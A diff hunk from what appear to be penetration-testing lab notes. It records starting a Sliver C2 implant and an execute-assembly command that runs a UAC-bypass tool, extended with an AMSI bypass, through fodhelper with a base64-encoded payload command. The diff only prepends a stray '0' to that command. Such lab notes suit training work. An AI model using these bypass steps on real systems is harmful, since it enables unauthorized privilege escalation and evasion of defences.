@@ -848,7 +848,7 @@ $method.Invoke(0, $null)
 - used sliver to start an implant on the Student instance
 - forked a UAC Bypass implementation on github and added an Amsi Bypass class to it (https://github.com/rogdooley/SharpBypassUAC)
 ```shell
-execute-assembly /home/roger/Documents/Tools/SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIGM6XHVzZXJzXE9mZnNlY1xEb3dubG9hZHNcU0hZX1BSRVNTUk9PTS5leGU=
+0execute-assembly /home/roger/Documents/Tools/SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIGM6XHVzZXJzXE9mZnNlY1xEb3dubG9hZHNcU0hZX1BSRVNTUk9PTS5leGU=
 ```
 
 ```powershell
